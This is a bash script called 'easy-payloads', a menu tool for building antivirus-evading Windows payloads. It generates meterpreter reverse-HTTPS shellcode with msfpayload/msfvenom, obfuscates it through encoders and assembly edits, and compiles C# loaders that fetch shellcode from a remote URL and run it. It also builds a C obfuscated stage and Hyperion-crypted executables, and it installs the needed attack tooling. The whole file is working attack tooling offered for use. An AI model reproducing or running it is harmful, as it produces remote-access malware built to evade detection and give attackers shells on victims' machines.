#!/bin/bash

#Clear some variables
unset x
unset y

#Save the starting location path
location=$PWD
clear

##################################################
#
# MISCELLANEOUS FUNCTIONS
# also, your mom
#
##################################################
f_checkexit(){
	if [ -z $clean ]; then
		f_Quit
	else
		rm -rf /tmp/ec &> /dev/null
		clear
		exit 2> /dev/null
	fi
}

f_Quit(){
	echo -e "\n\n\e[1;33m[*] Please standby while we clean up your mess...\e[0m\n"
	sleep 3
}

f_isxrunning(){
# Check to see if X is running
if [ -z $(pidof X) ] && [ -z $(pidof Xorg) ]; then
	isxrunning=
else
	isxrunning=1
fi

# Uncomment the following line to launch attacks in a screen session instead of an xterm window.
#unset isxrunning

if [ -z $isxrunning ]; then
	echo -e "\n\e[1;31m[-] X Windows not detected, your compilers will be launched in screen\e[0m\n"
	sleep 2
fi
}

##################################################
#
# BUILDING THINGS FOR FUN AND PROFIT!!
##################################################

f_csharpremote(){
clear
	echo -e "We need to generate the shellcode you'll be hosting on a webserver. Let's do that now"
	echo -e "Please provide the IP address for your handler:"
	read IP
	echo -e "Please provide the listening port for your handler:"
	read PORT
	echo -e "Thank you. I will now generate your shellcode and place it in your home folder as "datshellcode.txt"."
	echo -e "Please be patient with me.  I have a lot of magicscience to do."
#	msfvenom -p windows/shell/reverse_https LHOST=$IP -e x86/shikata_ga_nai -f raw -i 25 EXITFUNC=thread LPORT=$PORT | msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX > /root/datshellcode.txt
	msfpayload windows/meterpreter/reverse_https windows/shell/reverse_https LHOST=$IP LPORT=$PORT R > raw_binary
	ruby /opt/metasploit/msf3/lib/metasm/samples/disassemble.rb raw_binary > asm_code.asm
	sed -i -e 's/    xor edi, edi/    mov edi, ecx\n    push edi\n    pop edi\n    mov edi, ecx\n    xor ecx, ecx\n    mov ecx, edi\n    xor edi, edi/g' asm_code.asm
	ruby /opt/metasploit/msf3/lib/metasm/samples/exeencode.rb asm_code.asm  -o test.shell
	msfvenom -e x86/shikata_ga_nai -f raw -i 25 EXITFUNC=thread < test.shell | msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX > /root/datshellcode.txt
	echo -e "Now we will compile the binary for you."
	echo -e "Please provide the full URL where your shellcode will be hosted"
	echo -e "ex: "http://you.99k.org/shellcode.txt"; even HTTPS is acceptable "https://yourdomain.com/shellcode.txt""
	read remoteURL
	sleep 2
	cp /tmp/ep/csharp/remote/DotNetAVBypass/Program.cs /tmp/ep/csharp/remote/DotNetAVBypass/compile.cs
	sed -i -e 's/ThisIsYourURL/"$remoteURL"/g' /tmp/ep/csharp/remote/DotNetAVBypass/compile.cs
	gmcs /tmp/ep/csharp/remote/DotNetAVBypass/compile.cs -pkg:dotnet -out:/root/csharpremote_payload.exe
	rm /tmp/ep/csharp/remote/DotNetAVBypass/compile.cs
	echo -e "Your payload has been generated at /root/csharpremote_payload.exe"
	echo -e "I will now return you to the main menu." 
sleep 5
f_mainmenu
}

f_csharplocal(){
clear
	echo -e "We need to generate the shellcode for use in your payload. Let\'s do that now"
	echo -e "Please provide the IP address for your handler:"
	read IP
	echo -e "Please provide the listening port for your handler:"
	read PORT
	echo -e "Thank you. I will now generate your shellcode for use in the payload."
	echo -e "Please be patient with me.  I have a lot of magicscience to do."
#	msfvenom -p windows/shell/reverse_https LHOST=$IP -e x86/shikata_ga_nai -f raw -i 25 EXITFUNC=thread LPORT=$PORT | msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX > /root/datshellcode.txt
	msfpayload windows/meterpreter/reverse_https windows/shell/reverse_https LHOST=$IP LPORT=$PORT R > raw_binary
	ruby /opt/metasploit/msf3/lib/metasm/samples/disassemble.rb raw_binary > asm_code.asm
	sed -i -e 's/    xor edi, edi/    mov edi, ecx\n    push edi\n    pop edi\n    mov edi, ecx\n    xor ecx, ecx\n    mov ecx, edi\n    xor edi, edi/g' asm_code.asm
	ruby /opt/metasploit/msf3/lib/metasm/samples/exeencode.rb asm_code.asm  -o test.shell
	msfvenom -e x86/shikata_ga_nai -f raw -i 25 EXITFUNC=thread < test.shell | msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX > /root/datshellcode.txt
	echo -e "Now we will compile the binary for you."
	sleep 2
	cat /root/datshellcode.txt 
	read SHELLCODE
	cp /tmp/ep/csharp/local/DotNetAVBypass/Program.cs /tmp/ep/csharp/local/DotNetAVBypass/compile.cs
	sed -i -e 's/ShellcodeGoesHere/"$SHELLCODE"/g' /tmp/ep/csharp/local/DotNetAVBypass/compile.cs
	gmcs /tmp/ep/csharp/local/DotNetAVBypass/compile.cs -pkg:dotnet -out:/root/csharplocal_payload.exe
	rm /tmp/ep/csharp/local/DotNetAVBypass/compile.cs
	echo -e "Your payload has been generated and can be found in your home folder as /root/csharplocal_payload.exe"
	echo -e "I will now return you to the main menu."
sleep 5
f_mainmenu
}

f_cloops(){
clear
	echo -e "We need to specify some things for your payload. Let's do that now"
	echo -e "Please provide the IP address for your handler:"
	read IP
	echo -e "Please provide the listening port for your handler:"
	read PORT
	echo -e "Thank you. I will now build your obfuscated stage."
	sleep 2
	cp /tmp/ep/c_loops/main-timeobfs.c /tmp/ep/c_loops/compile.c
	sed -i -e 's/ListenerIP/"$IP"/g' /tmp/ep/c_loops/compile.c
	sed -i -e 's/ListenerPort/"$PORT"/g' /tmp/ep/c_loops/compile.c
	gcc /tmp/ep/c_loops/compile.c /root/cloops_payload.exe
	rm /tmp/ep/c_loops/compile.c
	echo -e "Your payload has been created. You may find it in your home folder as cloops_payload.exe"
	echo -e "I will now return you to the main menu."
sleep 5
f_mainmenu
}

f_ghostasm(){
clear
	echo -e "We need to generate the shellcode for use in your payload. Let\'s do that now"
	echo -e "Please provide the IP address for your handler:"
	read IP
	echo -e "Please provide the listening port for your handler:"
	read PORT
	echo -e "Thank you. I will now generate your shellcode for use in the payload."
	echo -e "Please be patient with me.  I have a lot of magicscience to do."
	msfpayload windows/meterpreter/reverse_https windows/shell/reverse_https LHOST=$IP LPORT=$PORT R > raw_binary
	ruby /opt/metasploit/msf3/lib/metasm/samples/disassemble.rb raw_binary > asm_code.asm
	sed -i -e 's/    xor edi, edi/    mov edi, ecx\n    push edi\n    pop edi\n    mov edi, ecx\n    xor ecx, ecx\n    mov ecx, edi\n    xor edi, edi/g' asm_code.asm
	ruby /opt/metasploit/msf3/lib/metasm/samples/exeencode.rb asm_code.asm  -o test.shell

	msfvenom -e x86/shikata_ga_nai -f raw -i 25 EXITFUNC=thread < test.shell | msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX > /root/datfinalshellcode.txt

	echo -e "Your shellcode has been generated and can be found in your home folder as datfinalshellcode.txt"
	echo -e "I will now return you to the main menu."
sleep 5
f_mainmenu
}


##################################################
#
#	ENCRYPTION FUNCTIONS
#
##################################################
#f_autoit(){
#clear
# process: downloads and runs a remote exe. 
# 
# compile loader with pointer to remote exe.
# requires that you already have an exe, such as the one created from the ASM modification. 
# or you can ignore this altogether because i'm not sure i even want to put it in here anymore
# need: path to executable
#	echo -e "We need to do some things. Let's do them now"
#	echo -e "Please provide the path of your existing, unencrypted executable address for your handler:"
#	read PATH
#	echo -e "Please provide the remote path where you will be putting your encrypted executable:"
#	read REMOTEPATH
#	echo -e "Thank you. I will now do some magicscience for you."
#wine /tmp/ep/autoit/install/Aut2Exe/Aut2exe.exe /in /tmp/ep/autoit/source/dec.au3 /out /root/encryptedloader.exe /x86
#
#lol I need another redbull
#}



f_Hyperion(){
clear
	echo -e "Here cometh the hot badness."
	echo -e "Please provide the IP address of your handler:"
	read IP
	echo -e "Please proide the listening port for your handler:"
	read PORT
	echo -e "Thank you.  I will now generate your shellcode for use in the payload."
	echo -e "Please be patient with me as I have a WHOLE lot of magicscience to do."
	msfpayload windows/meterpreter/reverse_https windows/shell/reverse_https LHOST=$IP LPORT=$PORT R > raw_binary
	echo -e "Now dissasembling and modifying the ASM"
	ruby /tmp/ep/metasm/samples/disassemble.rb raw_binary > asm_code.asm
	sed -i -e 's/    xor edi, edi/    mov edi, ecx\n    push edi\n    pop edi\n    mov edi, ecx\n    xor ecx, ecx\n    mov ecx, edi\n    xor edi, edi/g' asm_code.asm
	ruby /tmp/ep/metasm/samples/exeencode.rb asm_code.asm  -o test.shell
	echo -e "generating the executable to be encrypted"
	msfvenom -e x86/shikata_ga_nai -f raw -i 25 EXITFUNC=thread < test.shell | msfencode -a x86 -e x86/alpha_mixed -t exe BufferRegister=EAX > /tmp/ep/hyperion/precrypt.exe
	echo -e "lol hyperion"
	wine /tmp/ep/hyperion/crypter.exe /tmp/ep/hyperion/precrypt.exe /root/awwwwyeaaaah.exe
	echo -e "your executable has been generated and can be found at /root/awwwwyeaaaah.exe"
	echo -e "I will now return you to the main menu"
sleep 5
f_mainmenu
}




##################################################
#
# PREREQ FUNCTIONS
#
##################################################
f_msfupdate(){
	echo -e "updating metasploit framework"
	msfupdate
sleep 3
f_prereqs
}

f_hyperioninstall(){
	echo -e "Downloading and unzipping necessary files for hyperion"
	mkdir /tmp/ep/hyperion
	wget -c http://nullsecurity.net/tools/binary/Hyperion-1.0.zip
	unzip Hyperion-1.0.zip -d /tmp/ep/hyperion
	rm Hyperion-1.0.zip
	#get and install mingw for hyperion needs
	wget -c http://downloads.sourceforge.net/project/mingw/Installer/mingw-get-inst/mingw-get-inst-20120426/mingw-get-inst-20120426.exe
	wine mingw-get-inst-20120426.exe
	rm mingw-get-inst-20120426.exe
	wine /root/.wine/drive_c/MinGW/bin/g++.exe ./Src/Crypter/*.cpp -o /tmp/ep/hyperion/crypter.exe



sleep 3
f_prereqs
}	


f_metasminstall(){
	echo -e "pulling down metasm because you have found it to be missing"
	rm -Rf /tmp/ep/metasm
	mkdir /tmp/ep/metasm
	git clone https://github.com/jjyg/metasm.git /tmp/ep/metasm
sleep 3
f_prereqs
}

f_mcsupdate(){
	echo -e "updating mono"
	apt-get upgrade mono-complete
sleep 3
f_prereqs
}

f_csharpupdate(){
	echo -e "Updating local .NET source code"
	rm -Rf /tmp/ep/csharp/
	mkdir /tmp/ep/csharp/ && mkdir /tmp/ep/csharp/remote/ && mkdir /tmp/ep/csharp/local/
	git clone https://github.com/lockfale/DotNetAVBypass-Master.git /tmp/ep/csharp/remote/
sleep 1
	git clone https://github.com/lockfale/DotNetAVBypass.git /tmp/ep/csharp/local/
sleep 3
f_prereqs
}

f_cloopsupdate(){
	echo -e "Updating local C with lolloops source"
	rm -Rf /tmp/ep/c_loops/
	mkdir /tmp/ep/c_loops/
	git clone https://github.com/lockfale/meterpreterjank.git /tmp/ep/c_loops/
sleep 3
f_prereqs
}

f_wineupdate(){
	echo -e "updating wine"
	apt-get upgrade wine
sleep 3
f_prereqs
}


##################################################
#
# MENU FUNCTIONS
#
##################################################

f_Banner(){
echo -e "##################################################################################################################"
echo -e "# easy-payloads is a simple bash script which makes generating undetectable payloads a little easier.            #"
echo -e "#________________  .____    ___________                                                                          #"
echo -e "#\_   _____/  _  \ |    |   \_   _____/                                                                          #"
echo -e "# |    __)/  /_\  \|    |    |    __)_                                                                           #"
echo -e "# |     \/    |    |    |___ |        \                                                                          #"
echo -e "# \___  /\____|__  |_______ /_______  /                                                                          #"
echo -e "#   _____        \/        \/       \/.__        __  .__                        _____                            #"
echo -e "#  /  _  \   ______ __________   ____ |_______ _/  |_|__| ____   ____     _____/ ____\                           #"
echo -e "# /  /_\  \ /  ___//  ___/  _ \_/ ___\|  \__  \\   __|  |/  _ \ /    \   /  _ \    __\                            #"
echo -e "#/    |    \\___ \ \___ (  <_> \  \___|  |/ __ \|  | |  (  <_> |   |  \ (  <_>  |  |                              #"
echo -e "#\____|__  /____  /____  \____/ \___  |__(____  |__| |__|\____/|___|  /  \____/|__|                              #"
echo -e "#.____   \/     \/     \__          \/        \/          ___                                                    #"
echo -e "#|    |    ____   ____ |  | __ ___________   ____________/   \                                                   #"
echo -e "#|    |   /  _ \_/ ___\|  |/ //  ___\____ \ /  _ \_  __ \   __\                                                  #"
echo -e "#|    |__(  <_> \  \___|    < \___ \|  |_> (  <_> |  | \/|  |                                                    #"
echo -e "#|_______ \____/ \___  |__|_ /____  |   __/ \____/|__|   |__|                                                    #"
echo -e "#___________       __\/.__  \/    \/|__|  .__                _                                                   #"
echo -e "#\_   _____/ _____/  |_|  |__  __ __ _____|_______    ______/  |_ _____                                          #"
echo -e "# |    __)_ /    \   __|  |  \|  |  /  ___|  \__  \  /  ___\   __/  ___/                                         #"
echo -e "# |        |   |  |  | |   Y  |  |  \___ \|  |/ __ \_\___ \ |  | \___ \                                          #"
echo -e "#/_______  |___|  |__| |___|  |____/____  |__(____  /____  >|__|/____  >                                         #"
echo -e "#       \/     \/          \/          \/        \/     \/          \/                                           #"
echo -e "#                                                                                                                #"
echo -e "##################################################################################################################"
echo -e ""#THE BEER-WARE LICENSE" (Revision 34) - No Dennis Kuntz Open Source License:                                      #"
echo -e "#As long as you email funny stories to us, you                                                                   #"
echo -e "#can do whatever you want with this stuff. Unless you are Dennis Kuntz.                                          #"
echo -e "#Under no circumstances shall Dennis Kuntz be granted use of this software,                                      #"
echo -e "#source code, documentation or other related material.                                                           #"
echo -e "#Persons dealing in the Software agree not to knowingly distribute these materials                               #"
echo -e "#or any derivative works to Dennis Kuntz. *                                                                      #"
echo -e "##################################################################################################################"
}

f_Banner2(){
	echo -e "##############################################"
	echo -e "#    Seriously, don't let Dennis use this.   #"
	echo -e "#		    pls.		      #"
	echo -e "#    That would be against the rules.        #"
	echo -e "#      We always play by the rules.	      #"
	echo -e "##############################################"
}

f_Banner3(){
	echo -e "##############################################"
	echo -e "#	For real though. Dennis go away.      #"
	echo -e "#	      we aren't kidding.              #"
	echo -e "##############################################"
}

##################################################
f_encryptionoptions(){
clear
f_Banner3

	echo "1.  Hyperion"
	echo " Yeah, not much to see here yet really.  I'm totally going to gank rel1k's latest SET stuff though"
	echo "2.  Return to main menu"
	echo
	read -p "Choice: " mainchoice

	case $mainchoice in
	1) clean=; f_Hyperion ;;
	2) clean=; f_mainmenu ;;
	1968) f_pbs ;;
	Q|q) f_Quit ;;
	*) f_mainmenu ;;
	esac	
}

##################################################
f_prereqs(){
	clear
	f_Banner2

	echo "1.  Update Metasploit Framework"
	echo "2.  Hyperion install"
	echo "3.  Metasm install"
	echo "4.  Update/Install MCS C# compiler"
	echo "5.  Checkout latest C# (remote and local shellcode)"
	echo "6.  Checkout latest C stage1 with loops"
	echo "7.  Update/Install WINE"
	echo "8.  How-to Videos (Launches Web Browser - not yet implemented)"
	echo "9.  Previous Menu"
	echo
	read -p "Choice: " prereqschoice

	case $prereqschoice in
	1) f_msfupdate ;;
	2) f_hyperioninstall ;;
	3) f_metasminstall ;;
	4) f_mcsupdate ;;
	5) f_csharpupdate ;;
	6) f_cloopsupdate ;;
	7) f_wineupdate ;;
	8) f_howtos ;;
	9) f_mainmenu ;;
	*) f_prereqs ;;
	esac
}

##################################################
f_mainmenu(){
	clear
	f_Banner

	echo "1.  Prerequisites & Configurations"
	echo "2.  C# - Remote Shellcode download and exec"
	echo "3.  C# - Hardcoded Shellcode exec"
	echo "4.  C with loops obfuscation - meterpreter stage 1"
	echo "5.  GhostASM - for some lulzy shellcode."
	echo "6.  Encryption"
	echo "7.  Quit current payload generation session"
	echo
	read -p "Choice: " mainchoice

	case $mainchoice in
	1) clean=; f_prereqs ;;
	2) clean=; f_csharpremote ;;
	3) clean=; f_csharplocal ;;
	4) clean=; f_cwithloops ;;
	5) clean=; f_ghostasm ;;
	6) clean=; f_encryptionoptions ;;
	7) f_checkexit ;;
	1968) f_pbs ;;
	Q|q) f_Quit ;;
	*) f_mainmenu ;;
	esac
}


f_isxrunning
clean=1
f_mainmenu